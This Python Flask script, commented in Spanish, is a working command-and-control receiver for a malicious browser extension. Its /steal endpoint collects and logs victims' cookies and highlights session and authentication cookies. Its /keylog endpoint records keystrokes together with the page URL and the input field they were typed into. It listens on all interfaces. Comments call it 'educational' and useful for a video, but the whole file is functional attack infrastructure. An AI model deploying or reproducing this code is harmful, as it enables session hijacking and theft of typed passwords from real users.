#!/usr/bin/env python3
from flask import Flask, request, jsonify
from datetime import datetime
import json
import os

app = Flask(__name__)

LOG_FILE = "stolen_data.log"

def log_to_file(data):
    """Añade una entrada con timestamp al archivo de log."""
    with open(LOG_FILE, 'a') as f:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        f.write(f"\n[{timestamp}] {data}\n")

@app.route('/steal', methods=['POST'])
def steal_cookies():
    """Endpoint para recibir cookies robadas - Versión Mejorada."""
    try:
        stolen_data = request.get_json()
        if not stolen_data:
            print("[!] Recibido JSON vacío o inválido")
            return jsonify({"status": "error", "message": "Datos vacíos"}), 400
            
        data_type = stolen_data.get('type', 'desconocido')
        data_content = stolen_data.get('data', [])
        
        print(f"\n[+] {data_type.upper()} RECIBIDOS!")
        
        # Registrar TODO el contenido para análisis (útil para tu video)
        log_to_file(f"TIPO: {data_type} | DATOS: {json.dumps(stolen_data, indent=2)}")
        
        # MANEJO INTELIGENTE DE DIFERENTES FORMATOS
        if data_type == 'cookies' or data_type == 'cookies_v3':
            # Formato esperado: lista de diccionarios de cookies
            print(f"   Cantidad de cookies: {len(data_content) if isinstance(data_content, list) else 'N/A'}")
            
            for cookie in data_content if isinstance(data_content, list) else []:
                if isinstance(cookie, dict):
                    # FORMATO 1: Diccionario con claves 'name', 'value', 'domain'
                    name = cookie.get('name', 'SIN_NOMBRE')
                    value = cookie.get('value', '')
                    domain = cookie.get('domain', 'SIN_DOMINIO')
                    
                    # Mostrar solo las primeras 30 caracteres del valor
                    value_preview = (value[:30] + '...') if len(value) > 30 else value
                    print(f"     - {name} = {value_preview} (Dominio: {domain})")
                    
                    # Punto educativo: mostrar si es cookie de sesión
                    if 'session' in name.lower() or 'auth' in name.lower():
                        print(f"       ⚠️  POSIBLE COOKIE DE SESIÓN")
                        
                elif isinstance(cookie, str):
                    # FORMATO 2: String simple (ej: "session=abc123; domain=.facebook.com")
                    print(f"     - [FORMATO TEXTO] {cookie[:50]}...")
                else:
                    # FORMATO 3: Algo inesperado
                    print(f"     - [FORMATO DESCONOCIDO] {type(cookie)}: {str(cookie)[:50]}...")
        
        elif data_type == 'cookie_change':
            # Formato: objeto changeInfo de chrome.cookies.onChanged
            print(f"   Evento de cambio de cookie detectado")
            
            if isinstance(data_content, dict):
                # El objeto changeInfo tiene 'cause', 'cookie', 'removed'
                cookie_obj = data_content.get('cookie')
                cause = data_content.get('cause', 'desconocida')
                removed = data_content.get('removed', False)
                
                if isinstance(cookie_obj, dict):
                    status = "BORRADA" if removed else "CREADA/MODIFICADA"
                    name = cookie_obj.get('name', 'SIN_NOMBRE')
                    domain = cookie_obj.get('domain', 'SIN_DOMINIO')
                    print(f"     - Cookie {status}: {name} (Dominio: {domain}, Causa: {cause})")
                else:
                    print(f"     - [INFO DE CAMBIO SIN DETALLES] Causa: {cause}, Eliminada: {removed}")
            else:
                print(f"     - [FORMATO INESPERADO] Contenido: {str(data_content)[:100]}...")
        
        else:
            print(f"   [!] Tipo de dato no reconocido: '{data_type}'")
            print(f"   [!] Datos crudos: {str(stolen_data)[:200]}...")
        
        return jsonify({"status": "success", "message": "Datos procesados"}), 200
        
    except Exception as e:
        print(f"\n[!] ERROR CRÍTICO en steal_cookies: {type(e).__name__}: {str(e)}")
        log_to_file(f"ERROR: {type(e).__name__}: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/keylog', methods=['POST'])
def keylogger():
    """Endpoint para recibir las pulsaciones de teclas."""
    key_data = request.get_json()
    print(f"\n[+] TECLA REGISTRADA:")
    print(f"   URL: {key_data.get('url')}")
    print(f"   Tecla: '{key_data.get('key')}' en elemento {key_data.get('input')}")

    # Log en archivo
    log_to_file(f"KEYLOG: {json.dumps(key_data)}")

    return jsonify({"status": "success"}), 200

if __name__ == '__main__':
    print("[*] Servidor de recolección malicioso iniciado...")
    print("[*] Escuchando en http://0.0.0.0:5000")
    print("[*] Esperando datos de la extensión...")
    app.run(host='0.0.0.0', port=5000, debug=True)
